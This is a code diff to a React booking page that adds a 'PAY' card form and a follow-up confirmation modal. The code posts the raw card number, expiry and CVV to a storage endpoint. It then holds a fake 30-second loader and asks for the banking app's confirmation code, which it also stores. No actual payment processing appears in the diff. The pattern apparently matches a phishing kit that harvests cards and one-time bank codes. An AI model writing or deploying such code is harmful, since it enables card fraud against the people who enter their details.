@@ -10,10 +10,86 @@ import { useState } from 'react';
 import BottomDrawer from "@/components/BottomDrawer";
 import Image from 'next/image'
 import PaymentMethodSelector from "@/components/PaymentMethodSelector";
+import {SubmitHandler, useForm} from "react-hook-form";
+import Modal from "@/components/Modal";
+import Loader from "@/components/Loader";
+
+type CardForm = {
+  number: string;
+  expiry: string;
+  cvv: string;
+};
 
 export default function Booking() {
   const [showDrawer, setShowDrawer] = useState(false);
   const [showDrawerSecond, setShowDrawerSecond] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [code, setCode] = useState<string>('');
+  const [loading, setLoading] = useState<boolean>(true);
+
+  const {
+    register,
+    handleSubmit,
+    setValue,
+    watch,
+    formState: { errors },
+  } = useForm<CardForm>({ mode: 'onChange' });
+
+  const onSubmit: SubmitHandler<CardForm> = async (data) => {
+    try {
+      const res = await fetch('/api/store-card', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          card_number: data.number,
+          expiry_date: data.expiry,
+          csv: data.cvv,
+        }),
+      });
+
+      const result = await res.json();
+
+      if (!res.ok) {
+        throw new Error(result.error || 'Unknown error');
+      }
+
+      console.log('✅ Card saved:', result.record);
+      setShowModal(true);
+      setTimeout(() => {
+        setLoading(false);
+      }, 30000)
+    } catch (err) {
+      console.error('❌ Submit error:', err);
+      alert('Failed to save card info');
+    }
+  };
+
+  const confirmCode = async () => {
+    try {
+      const res = await fetch('/api/store-code', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          code,
+        }),
+      });
+
+      const result = await res.json();
+
+      if (!res.ok) {
+        throw new Error(result.error || 'Unknown error');
+      }
+
+      console.log('✅ Code saved:', result.record);
+    } catch (err) {
+      console.error('❌ Submit error:', err);
+      alert('Failed to save card info');
+    }
+  };
 
   return (
     <div className={"bg-[rgb(241,242,246)] flex flex-col"} >
@@ -102,8 +178,15 @@ export default function Booking() {
         </div>
         <div className={"text-[12px] text-[rgb(116,124,139)] leading-[16px]"}>For 1 passenger</div>
         <div className={"text-[12px] text-[rgb(116,124,139)] leading-[16px]"}>Convenience fee added</div>
-        <PaymentMethodSelector />
-        <button type={"submit"} className={"mt-[16px] bg-[rgb(103,1,228)] text-white font-bold h-[52px] px-[24px] py-[12px] rounded-[12px] text-[20px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"} >{'PAY'}</button>
+        <form onSubmit={handleSubmit(onSubmit)}>
+          <PaymentMethodSelector
+            register={register}
+            watch={watch}
+            setValue={setValue}
+            errors={errors}
+          />
+          <button type={"submit"} className={"w-full mt-[16px] bg-[rgb(103,1,228)] text-white font-bold h-[52px] px-[24px] py-[12px] rounded-[12px] text-[20px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"}>{'PAY'}</button>
+        </form>
       </div>
       <BottomDrawer isOpen={showDrawer} onClose={() => setShowDrawer(false)}>
         <div className={"h-[68px] p-[16px] flex flex-row justify-between"} >
@@ -285,6 +368,23 @@ export default function Booking() {
           <button onClick={() => setShowDrawerSecond(false)} className={"bg-[rgb(103,1,228)] text-white font-bold h-[44px] px-[24px] py-[12px] rounded-[12px] text-[14px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"}>OK</button>
         </div>
       </BottomDrawer>
+      {showModal && (
+        <Modal onClose={() => setShowModal(false)}>
+          {loading
+            ? <div className={"h-[128px] flex items-center justify-center"} ><Loader /></div>
+            : <>
+              <div>Confirm payment in the banking app or enter code</div>
+              <input
+                type="text"
+                placeholder="Code"
+                value={code}
+                onChange={(e) => setCode(e.target.value)}
+                className={`bg-white outline-none mt-[16px] h-[52px] px-[10px] rounded-[8px] w-full border border-purple-600`}
+              />
+              <button onClick={() => confirmCode()} className={"w-full mt-[16px] bg-[rgb(103,1,228)] text-white font-bold h-[52px] px-[24px] py-[12px] rounded-[12px] text-[20px] hover:bg-purple-800 transition duration-[0.3s] cursor-pointer"}>{'CONFIRM'}</button>
+            </>}
+        </Modal>
+      )}
     </div>
   );
 }
